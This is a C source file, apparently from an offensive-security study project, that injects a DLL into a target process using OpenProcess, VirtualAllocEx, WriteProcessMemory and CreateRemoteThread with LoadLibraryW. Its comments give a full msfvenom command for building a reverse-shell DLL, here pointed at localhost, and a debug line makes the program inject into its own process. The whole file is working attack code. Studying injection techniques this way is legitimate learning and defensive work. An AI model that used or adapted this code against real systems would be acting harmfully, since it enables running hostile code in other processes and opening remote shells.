/*
 * Inject a given payload into another process and run it.
 * Credit to Spotless of ired.team, https://ired.team/offensive-security/code-injection-process-injection
 *
 * To see this same shellcode being used on the local process, see Payloads
 */

#include <Windows.h>
#include <stdio.h>

int main(int argc, char *argv[]) {
    HANDLE processHandle;
    PVOID remoteBuffer;
    PVOID remoteThread;
    DWORD pid;

    // Reverse shell to 127.0.0.1:31337
    // msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=31337 -f dll -b \x00\x0a\x0d -o reverse.dll
    // Can test with rundll32.exe reverse.dll,dll_main
    wchar_t dllPath[] = TEXT("E:\\Exclusion Zone\\winjection\\Attacks\\DLLInjection\\reverse.dll");

    // Get a PID, error out if improper input for PID
     if(!argv[1] || !(pid=atoi(argv[1]))) {
        printf("No PID was supplied. Exiting.\n");
        //return -1;
    }

    // For debug: inject into myself
    pid = GetCurrentProcessId();

    // Potentially won't work if cannot access process, can't allocate space in it, etc. (No error checking)
    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    printf("Process handle: %p\n", processHandle);
    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    printf("Remote buffer : %p\n", remoteBuffer);
    int temp = WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);
    printf("Wrote memory  : %d\n", temp);
    PTHREAD_START_ROUTINE threadStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
    printf("Thread address: %p\n", threadStartRoutineAddress);
    remoteThread = CreateRemoteThread(processHandle, NULL, 0, threadStartRoutineAddress, remoteBuffer, 0, NULL);
    printf("Remote address: %d\n", remoteThread);
    temp = WaitForSingleObject(remoteThread, INFINITE);
    printf("Waited        : %d\n", temp);
    temp = VirtualFreeEx(processHandle, remoteBuffer, NULL, MEM_RELEASE);
    printf("Freed         : %d\n", temp);
    printf("Last error    : %d\n", GetLastError());
    CloseHandle(processHandle);

    return 0;
}